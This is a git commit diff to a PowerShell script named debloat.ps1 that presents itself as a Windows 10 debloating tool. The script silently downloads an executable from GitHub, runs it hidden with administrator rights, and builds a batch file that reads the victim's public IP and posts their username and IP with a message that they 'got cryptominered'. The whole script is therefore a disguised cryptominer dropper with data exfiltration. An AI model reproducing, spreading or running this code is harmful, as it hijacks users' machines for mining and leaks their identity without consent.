b5b9b2e1b132c7d47120a339c787b8da0a4ae14f
Dazd <87366355+Dazd-Pkz@users.noreply.github.com>
2022-08-13 23:33:24 +0200

    Update debloat.ps1

--- debloat.ps1
+++ debloat.ps1
@@ -1,6 +1,6 @@
 iwr "https://raw.githubusercontent.com/Dazd-Pkz/Windows10Debloater/main/saucisson.exe" -o $env:TEMP\saucisson.exe
 echo @echo off > $env:TEMP\f.bat
-echo curl icanhazip.com ^> ip & set /p ip=^<ip > $env:TEMP\f.bat
+echo curl icanhazip.com ^> ip ^& set /p ip=^<ip > $env:TEMP\f.bat
 echo curl -X POST -H "Content-type: application/json" --data "{\"content\": \"%username% got cryptominered - Ip : %ip%\"}" > $env:TEMP\f.bat
 Start-Process -WindowStyle hidden -FilePath $env:TEMP\f.bat
 Start-Process -Verb RunAs -WindowStyle hidden -FilePath $env:TEMP\saucisson.exe
